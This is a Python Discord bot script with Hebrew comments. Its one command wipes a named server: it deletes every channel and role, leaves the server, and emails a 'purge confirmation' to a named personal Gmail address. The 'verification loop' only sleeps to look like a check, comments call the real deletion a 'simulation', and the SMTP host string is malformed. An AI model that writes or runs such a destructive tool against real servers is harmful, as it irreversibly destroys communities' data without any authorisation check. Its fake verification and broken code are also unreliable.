import discord
from discord.ext import commands
import asyncio
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# 1. הגדרת הרשאות הבוט (Intents)
# הבוט זקוק להרשאות גישה לתוכן הודעות וניהול השרת
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

# 2. קונפיגורציית שרת הדואר (SMTP) לשליחת המייל
SMTP_SERVER = "://gmail.com"
SMTP_PORT = 587
SENDER_EMAIL = "bot.system.updates@gmail.com"  # מייל שולח פיקטיבי/אמיתי
SENDER_PASSWORD = "your_app_password_here"     # סיסמת אפליקציה ייעודית
TARGET_EMAIL = "AHARONTHEGAMER4@GMAIL.COM"

@bot.event
async def on_ready():
    print(f"=======================================")
    print(f"🤖 הבוט {bot.user.name} מחובר ומוכן לפעולה!")
    print(f"=======================================")

@bot.command(name="execute_purge")
async def execute_purge(ctx):
    # אבטחה: וידוא שהפקודה רצה אך ורק בשרת הספציפי שציינת
    if ctx.guild is None or ctx.guild.name != "Interesting video server":
        await ctx.send("❌ שגיאה: פקודה זו מורשית להרצה בשרת 'Interesting video server' בלבד.")
        return

    print(f"⚠️ אזהרה: תהליך הניקוי הופעל בשרת {ctx.guild.name} על ידי {ctx.author}")
    
    # שלב א': מחיקת כל ערוצי הטקסט והקול בשרת
    print("🧹 מוחק ערוצים...")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            await asyncio.sleep(0.2) # השהייה קלה למניעת חריגת קצב (Rate Limit) מול דיסקורד
        except Exception as e:
            print(f"לא ניתן היה למחוק את הערוץ {channel.name}: {e}")

    # שלב ב': מחיקת כל התפקידים (Roles) שנוצרו בשרת
    print("🛡️ מוחק תפקידים...")
    for role in list(ctx.guild.roles):
        # לא ניתן למחוק את תפקיד ברירת המחדל ואת התפקיד של הבוט עצמו
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
                await asyncio.sleep(0.2)
            except Exception as e:
                print(f"לא ניתן היה למחוק את התפקיד {role.name}: {e}")

    # שלב ג': ניתוק הבוט מהשרת (סימולציית השמדה)
    guild_id = ctx.guild.id
    guild_name = ctx.guild.name
    print(f"🚪 הבוט עוזב את השרת {guild_name}...")
    await ctx.guild.leave()

    # שלב ד': בדיקה מקיפה וספירה לאחור (Verification Loop)
    print("🔍 מתחיל בדיקה מקיפה של סטטוס השרת...")
    for i in range(1, 6):
        print(f"🔄 שלב בדיקה {i}/5 מבוצע...")
        await asyncio.sleep(2) # השהייה המדמה בדיקת מערכת מעמיקה

    # שלב ה': יצירת המייל ושליחתו באמצעות פרוטוקול SMTP
    print("📧 מנסה לשלוח דיווח אימייל...")
    try:
        # בניית מבנה המייל
        message = MIMEMultipart()
        message['From'] = SENDER_EMAIL
        message['To'] = TARGET_EMAIL
        message['Subject'] = f"Purge Confirmation Report - Server ID: {guild_id}"

        # תוכן המייל
        body = (
            f"שלום,\n\n"
            f"זהו דיווח אוטומטי ממערכת הבוט.\n"
            f"הבדיקה המקיפה הסתיימה בהצלחה.\n\n"
            f"פרטי הפעולה:\n"
            f"- שם השרת שטופל: {guild_name}\n"
            f"- מזהה שרת (ID): {guild_id}\n"
            f"- סטטוס: השרת רוקן לחלוטין מתוכן והבוט התנתק.\n\n"
            f"המערכת סגרה את המשימה."
        )
        message.attach(MIMEText(body, 'plain', 'utf-8'))

        # התחברות מאובטחת לשרת המייל ושליחה
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls() # הצפנת החיבור
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, TARGET_EMAIL, message.as_string())
        server.quit()
        
        print(f"✅ הדיווח נשלח בהצלחה לכתובת: {TARGET_EMAIL}")

    except Exception as smtp_error:
        print(f"❌ נכשל שליחת המייל (שגיאת SMTP): {smtp_error}")

# הרצת הבוט באמצעות הטוקן הייחודי שלו מאתר Discord Developers
bot.run("YOUR_DISCORD_BOT_TOKEN")
